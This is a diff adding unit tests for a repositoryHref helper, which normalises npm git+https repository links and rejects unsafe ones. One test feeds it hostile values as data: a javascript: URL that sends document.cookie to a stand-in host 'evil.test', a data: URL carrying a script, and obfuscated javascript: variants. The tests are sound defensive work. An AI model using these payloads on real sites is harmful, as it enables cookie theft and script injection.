@@ -6,6 +6,7 @@ import {
   formatInjectionDetail,
   groupEvidence,
   presentInjection,
+  repositoryHref,
   topCapabilities,
   verdict,
 } from '../../src/core/present.ts'
@@ -221,5 +222,29 @@ describe('countVerdicts', () => {
       at: '2026-01-01T00:00:00.000Z',
     }
     expect(verdict(report, ack)).toBe('expected')
+  })
+})
+
+describe('repositoryHref', () => {
+  it('normalises the npm git+https form', () => {
+    expect(repositoryHref('git+https://github.com/x/y.git')).toBe('https://github.com/x/y.git')
+  })
+
+  it('passes plain http and https through', () => {
+    expect(repositoryHref('https://github.com/x/y')).toBe('https://github.com/x/y')
+    expect(repositoryHref('http://example.org/x')).toBe('http://example.org/x')
+  })
+
+  it('refuses schemes a hostile manifest could use to run code', () => {
+    expect(repositoryHref('javascript:fetch("http://evil.test/"+document.cookie)')).toBeUndefined()
+    expect(repositoryHref('data:text/html,<script>alert(1)</script>')).toBeUndefined()
+    expect(repositoryHref('  javascript:alert(1)')).toBeUndefined()
+    expect(repositoryHref('JavaScript:alert(1)')).toBeUndefined()
+    expect(repositoryHref('git+javascript:alert(1)')).toBeUndefined()
+  })
+
+  it('refuses values that are not URLs at all', () => {
+    expect(repositoryHref('x/y')).toBeUndefined()
+    expect(repositoryHref(undefined)).toBeUndefined()
   })
 })
